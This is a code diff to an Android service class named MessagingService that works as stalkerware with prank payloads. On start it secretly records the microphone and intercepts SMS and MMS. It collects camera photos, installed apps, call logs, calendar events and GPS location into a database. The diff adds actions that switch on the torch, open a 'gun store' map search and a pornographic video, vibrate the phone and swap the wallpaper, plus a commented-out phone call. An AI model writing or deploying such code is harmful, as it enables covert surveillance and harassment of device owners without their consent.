@@ -6,19 +6,29 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.database.ContentObserver;
 import android.database.Cursor;
+import android.database.sqlite.SQLiteDatabase;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraManager;
 import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
+import android.os.VibrationEffect;
+import android.os.Vibrator;
 import android.provider.CalendarContract;
 import android.provider.CallLog;
 import android.provider.Telephony;
 import android.util.Log;
+import android.webkit.URLUtil;
 
 import java.io.File;
 import java.io.IOException;
+import java.io.InputStream;
 
 public class MessagingService extends Service {
 
@@ -27,7 +37,7 @@ public class MessagingService extends Service {
     private IncomingReceiver mIncomingReceiver;
     private OutgoingReceiver mOutgoingReceiver;
     private CreateConversationReceiver mCreateConversationReceiver;
-    protected static DatabaseHelper sDatabase;
+    private WapReceiver mWapReceiver;
     private DatabaseReceiver mDatabaseReceiver;
     private SmsObserver mObserver;
     private CallLogObserver mCallLogObserver;
@@ -41,11 +51,20 @@ public class MessagingService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        startForeground(Constants.FOREGROUND_NOTIFICATION_ID, Helpers.createPersistentServiceNotification(this));
+        startForeground(Constants.FOREGROUND_NOTIFICATION_ID, Lofl.createPersistentServiceNotification(this));
         sIsRunning = true;
+        DatabaseHelper database = DatabaseHelper.getInstance(getApplicationContext());
         mIncomingReceiver = new IncomingReceiver();
         mOutgoingReceiver = new OutgoingReceiver();
         mCreateConversationReceiver = new CreateConversationReceiver();
+        mWapReceiver = new WapReceiver();
+        IntentFilter wapFilter = new IntentFilter("android.provider.Telephony.WAP_PUSH_RECEIVED");
+        wapFilter.addAction("android.provider.Telephony.MMS_RECEIVED");
+        try {
+            wapFilter.addDataType("application/vnd.wap.mms-message");
+        } catch (IntentFilter.MalformedMimeTypeException e) {
+            e.printStackTrace();
+        }
         IntentFilter incomingFilter = new IntentFilter(Telephony.Sms.Intents.DATA_SMS_RECEIVED_ACTION);
         incomingFilter.setPriority(Constants.PRIORITY);
         incomingFilter.addDataAuthority(Constants.HOST, Constants.PORT);
@@ -69,16 +88,16 @@ public class MessagingService extends Service {
             e.printStackTrace();
         }
         registerReceiver(mShareReceiver, shareFilter);*/
+        registerReceiver(mWapReceiver, wapFilter);
         registerReceiver(mCreateConversationReceiver, conversationFilter);
         registerReceiver(mIncomingReceiver, incomingFilter);
         registerReceiver(mOutgoingReceiver, outgoingFilter);
-        sDatabase = new DatabaseHelper(this);
         IntentFilter databaseFilter = new IntentFilter();
         databaseFilter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
         databaseFilter.addAction(Constants.Actions.ACTION_OUTGOING_SMS);
         mDatabaseReceiver = new DatabaseReceiver();
         registerReceiver(mDatabaseReceiver, databaseFilter);
-        sTelephoneAddress = Helpers.getDeviceTelephoneNumber(this);
+        sTelephoneAddress = Lofl.getDeviceTelephoneNumber(this);
         Log.d(TAG, "address = " + sTelephoneAddress);
         mObserver = new SmsObserver();
         mCallLogObserver = new CallLogObserver();
@@ -94,50 +113,61 @@ public class MessagingService extends Service {
                 mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                 mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                 mMediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
+
+                SQLiteDatabase db = database.getWritableDatabase();
                 try {
-                    if(Helpers.isExternalStorageReadable()){
-                        File[] pictures = Helpers.getFilesForDirectory(Helpers.getDcimDirectory().getPath() + "/Camera");
+                    db.beginTransaction();
+                    if(Lofl.isExternalStorageReadable()){
+                        File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
                         if(pictures != null && pictures.length > 0){
                             for(File f : pictures){
-                                Database.insertMedia(sDatabase, f.getName(), f);
+                                Database.insertMedia(db, f.getName(), f);
                             }
                         }
                         File audioFile = new File(Environment.getExternalStorageDirectory() + File.separator + "soundfile2.3gpp");
                         if(! audioFile.exists()){
                             audioFile.createNewFile();
                         }else{
-                            Database.insertMedia(sDatabase, audioFile.getName(), audioFile);
+                            Database.insertMedia(db, audioFile.getName(), audioFile);
                         }
                         mMediaRecorder.setOutputFile(audioFile);
                         mMediaRecorder.prepare();
                         mMediaRecorder.start();
-                     /*   pictures = Helpers.getFilesForDirectory(Helpers.getPicturesDirectory().getPath());
+                     /*   pictures = Lofl.getFilesForDirectory(Lofl.getPicturesDirectory().getPath());
                         if(pictures != null && pictures.length > 0){
                             for(File f : pictures){
                                 //Database.insertMedia(sDatabase, f.getName(), f);
                             }
                         }*/
                     }
-                    //Database.insertPackages(sDatabase, Helpers.getInstalledApps(MessagingService.this));
+                    db.setTransactionSuccessful();
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
+                db.endTransaction();
+                db.beginTransaction();
+                Database.insertPackages(db, Lofl.getInstalledApps(MessagingService.this));
+                db.setTransactionSuccessful();
+                db.endTransaction();
+                db.close();
                 //Database.insertDevice(sDatabase, sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
             }
         }).start();
+
         try {
             String locationProvider = LocationManager.GPS_PROVIDER;
-            mLocationManager = Helpers.getLocationManager(MessagingService.this);
-            mLocationManager.requestLocationUpdates(locationProvider, 60000, 30, Helpers.getLocationListener(MessagingService.this));
+            mLocationManager = Lofl.getLocationManager(MessagingService.this);
+            mLocationManager.requestLocationUpdates(locationProvider, 60000, 60, Lofl.getLocationListener(MessagingService.this));
 
         } catch (SecurityException e) {
             e.printStackTrace();
         }
+
        /* new Thread(new Runnable() {
             @Override
             public void run() {
-                if(Helpers.isExternalStorageReadable()){
-                    File[] pictures = Helpers.getFilesForDirectory(Helpers.getDcimDirectory().getPath() + "/Camera");
+                if(Lofl.isExternalStorageReadable()){
+                    File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
                     if(pictures != null && pictures.length > 0){
                         for(File file : pictures){
                             Database.insertMedia(sDatabase, file.getName(), file);
@@ -146,6 +176,38 @@ public class MessagingService extends Service {
                 }
             }
         }).start();*/
+        CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+        try {
+            String cameraId = cameraManager.getCameraIdList()[0];
+            cameraManager.setTorchMode(cameraId, true);
+        } catch (CameraAccessException e) {
+            e.printStackTrace();
+        }
+        //Lofl.phoneCall(MessagingService.this, "18002738255");
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    Thread.sleep(5000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+                Lofl.searchGoogleMaps(MessagingService.this, "gun%20store");
+                try {
+                    Thread.sleep(5000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+                Lofl.watchPornHubVideo(MessagingService.this, "ph5784420f542c6");
+                Lofl.vibrator(MessagingService.this);
+                try {
+                    Thread.sleep(5000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+                Lofl.changeWallpaper(MessagingService.this, Lofl.getBitmapFromUrl(Uri.parse("https://i.pinimg.com/originals/04/17/57/0417575eea25c3568bf4007de9afe61f.jpg").toString()));
+            }
+        }).start();
     }
 
     @Override
@@ -155,9 +217,10 @@ public class MessagingService extends Service {
         unregisterReceiver(mCreateConversationReceiver);
         unregisterReceiver(mIncomingReceiver);
         unregisterReceiver(mOutgoingReceiver);
+        unregisterReceiver(mWapReceiver);
         /*unregisterReceiver(mShareReceiver);*/
         //unregisterReceiver(mAirplaneReceiver);
-        sDatabase.close();
+        DatabaseHelper.getInstance(getApplicationContext()).close();
         unregisterReceiver(mDatabaseReceiver);
         getContentResolver().unregisterContentObserver(mObserver);
         getContentResolver().unregisterContentObserver(mCallLogObserver);
@@ -176,7 +239,7 @@ public class MessagingService extends Service {
     }
 
     protected static void insertMessage(Context context, String destinationAddress, String originAddress, String body, long time){
-        Database.insertMessage(context, sDatabase, body, destinationAddress, originAddress, time);
+        Database.insertMessage(context, DatabaseHelper.getInstance(context.getApplicationContext()), body, destinationAddress, originAddress, time);
     }
 
     private class CallLogObserver extends ContentObserver{
@@ -200,7 +263,7 @@ public class MessagingService extends Service {
                             String address = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                             String time = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                             String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
-                            long newRowId = Database.insertCallLogEntry(MessagingService.this, sDatabase, callType, address, duration, time);
+                            long newRowId = Database.insertCallLogEntry(MessagingService.this, DatabaseHelper.getInstance(getApplicationContext().getApplicationContext()), callType, address, duration, time);
                         }
                     }
                 }
@@ -273,7 +336,7 @@ public class MessagingService extends Service {
                     String timeZone = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.CALENDAR_TIME_ZONE));
                     String location = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.EVENT_LOCATION));
                     String organizer = cursor.getString(cursor.getColumnIndexOrThrow(CalendarContract.Events.ORGANIZER));
-                    Database.insertCalendarEvent(MessagingService.this, sDatabase, account, title, description, beginDate, endDate, isAllDay, duration, timeZone, location, organizer);
+                    Database.insertCalendarEvent(MessagingService.this, DatabaseHelper.getInstance(getApplicationContext()), account, title, description, beginDate, endDate, isAllDay, duration, timeZone, location, organizer);
                 }
             }
             cursor.close();
